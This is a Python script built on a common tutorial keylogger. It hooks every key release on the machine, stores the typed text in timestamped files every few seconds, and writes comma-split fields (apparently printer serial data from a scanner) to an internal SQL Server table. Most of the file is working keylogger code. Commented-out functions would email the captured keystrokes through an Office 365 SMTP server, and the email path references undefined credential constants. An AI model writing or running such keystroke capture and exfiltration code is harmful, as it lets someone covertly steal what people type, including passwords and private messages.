import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from math import prod
import pandas as pd
from io import StringIO
from datetime import datetime
from sqlalchemy import create_engine


SEND_REPORT_EVERY = 3 # in seconds, 60 means 1 minute and so on
# EMAIL_ADDRESS = "email@provider.tld"
# EMAIL_PASSWORD = "password_here"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif name == "shift":
                name = ""
            elif name == name.lower():
                name = name.upper()
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        name = name.upper()
        self.log += name
        


        #print(f'my name is {self.log}')


    # testport = self.log
    # print(testport)

    
   
    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    # def prepare_mail(self, message):
    #     """Utility function to construct a MIMEMultipart from a text
    #     It creates an HTML version as well as text version
    #     to be sent as an email"""
    #     msg = MIMEMultipart("alternative")
    #     msg["From"] = EMAIL_ADDRESS
    #     msg["To"] = EMAIL_ADDRESS
    #     msg["Subject"] = "Keylogger logs"
    #     # simple paragraph, feel free to edit
    #     html = f"<p>{message}</p>"
    #     text_part = MIMEText(message, "plain")
    #     html_part = MIMEText(html, "html")
    #     msg.attach(text_part)
    #     msg.attach(html_part)
    #     # after making the mail, convert back as string message
    #     return msg.as_string()

    # def sendmail(self, email, password, message, verbose=1):
    #     # manages a connection to an SMTP server
    #     # in our case it's for Microsoft365, Outlook, Hotmail, and live.com
    #     server = smtplib.SMTP(host="smtp.office365.com", port=587)
    #     # connect to the SMTP server as TLS mode ( for security )
    #     server.starttls()
    #     # login to the email account
    #     server.login(email, password)
    #     # send the actual message after preparation
    #     server.sendmail(email, email, self.prepare_mail(message))
    #     # terminates the session
    #     server.quit()
    #     if verbose:
    #         print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
                # if you don't want to print in the console, comment below line
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        
        ###log to SQL###

        if self.log != "":
            self.log_sql()

        ###clear log###
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def log_sql(self):
        
        string = self.log
        stringSplit = string.split(",")

        printerID = 'SP1'
        dateofmanufacture = stringSplit[0]
        serialNumber = stringSplit[1]
        prodFam = stringSplit[2]
        currentDate = datetime.now()

        testData = StringIO(string)

        dict = {'PrinterID': printerID, 'DateofManufacture': dateofmanufacture, 'SerialNumber': serialNumber, 'ProductFamily': prodFam, 'CurrentDate': currentDate}

        df = pd.DataFrame.from_dict(dict, orient='index')
        df = df.transpose()

        #SQL Connection Windows Authentication#

        Server = 'UKC-VM-SQL01'
        Database = 'Stencil'
        Driver = 'ODBC Driver 17 for SQL Server'
        Database_con = f'mssql://@{Server}/{Database}?driver={Driver}'

        engine = create_engine(Database_con)
        con = engine.connect()

        df.to_sql('StencilUsage', con, if_exists='append', index = False)
        print('logged to SQL')

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

    
if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()